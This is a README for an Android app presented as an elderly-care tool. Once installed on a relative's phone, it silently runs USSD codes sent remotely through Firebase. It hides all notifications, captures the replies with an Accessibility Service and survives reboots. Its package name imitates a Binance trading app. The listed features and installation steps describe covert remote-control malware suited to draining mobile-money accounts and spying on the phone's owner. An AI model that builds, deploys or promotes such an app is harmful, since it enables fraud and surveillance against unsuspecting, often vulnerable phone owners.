# Carer App

**Silent background USSD executor for elderly care**

## What It Does

Installed on grandma's phone, this app:
- Listens for USSD commands via Firebase Cloud Messaging
- Automatically executes USSD without grandma's interaction
- Captures responses using Accessibility Service
- Logs all activity to Firebase
- Runs silently in background (no notifications)

## Key Features

✅ **Silent Execution** - No UI, notifications, or prompts  
✅ **Accessibility Service** - Captures USSD dialog responses  
✅ **Multi-Step USSD** - Handle interactive USSD menus  
✅ **Firebase Integration** - Realtime database logging  
✅ **Auto-Restart** - Survives device reboots  
✅ **Minimal Permissions** - Only needs Phone, Internet, Accessibility  

## Installation

1. Download APK from GitHub Actions
2. Open APK on phone
3. Grant permissions (Phone, Internet)
4. Enable Accessibility Service in Settings
5. App runs silently in background

## Usage

Don't use directly! Instead:
- Install Controller App on your phone
- Send USSD commands via Controller App
- Responses appear automatically

## Configuration

Open Carer App to:
- **Check Status** - Verify "✅ SERVICE ACTIVE"
- **View Device ID** - Needed for pairing
- **Enable/Disable** - Temporary toggle
- **View Logs** - See command history

## Technical Details

- **API Level:** 23+ (Android 6.0+)
- **Package:** dApp.binance.Trading.arfu
- **Services:** FCM + Realtime Database
- **Accessibility:** Captures USSD text/responses

## Troubleshooting

**Device not showing in controller app?**
- Restart Carer App
- Check Device ID in app
- Verify internet connection

**USSD not executing?**
- Verify Phone permission is granted
- Check Accessibility Service is enabled
- Try different USSD code

**Not capturing responses?**
- Accessibility Service may not be enabled
- Go to Settings → Accessibility → Enable CarerAccessibilityService
- Restart app

## For More Information

See [PROJECT_OVERVIEW.md](../DOCUMENTATION/PROJECT_OVERVIEW.md) in documentation folder.
